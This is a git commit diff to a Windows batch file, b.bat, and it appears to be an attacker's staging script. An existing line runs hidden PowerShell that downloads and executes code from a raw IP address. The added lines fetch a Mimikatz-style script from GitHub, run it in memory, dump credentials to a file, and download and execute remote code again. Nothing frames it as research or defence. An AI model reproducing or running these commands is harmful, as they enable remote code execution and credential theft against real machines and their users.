bdc55ca67d5d3c3982d883f214868309e1dd3d81
ofswbug <72555151+ofswbug@users.noreply.github.com>
2021-10-21 17:51:03 +0300

    Update b.bat

--- b.bat
+++ b.bat
@@ -1,2 +1,4 @@
 C:\Windows\System32\WindowsPowershell\v1.0\powershell -w hidden "IEX (New-Object Net.WebClient).DownloadString('http://52.29.134.186:80/index.php');"
 whoami > C:\users\tomcat\desktop\who.txt
+$objXmlHttp = New-Object -ComObject MSXML2.ServerXMLHTTP; $objXmlHttp.Open("GET", "https://github.com/ofswbug/a/blob/main/Invoke-memelon.ps1?raw=true", $False);  $objXmlHttp.Send(); $objXmlHttp.responseText | iex; Invoke-mimikatz -DumpCreds > c:\users\tomcat\desktop\creds.txt
+$objXmlHttp = New-Object -ComObject MSXML2.ServerXMLHTTP; $objXmlHttp.Open("GET", "http://52.29.134.186:80/index.php", $False);  $objXmlHttp.Send(); $objXmlHttp.responseText | iex; 
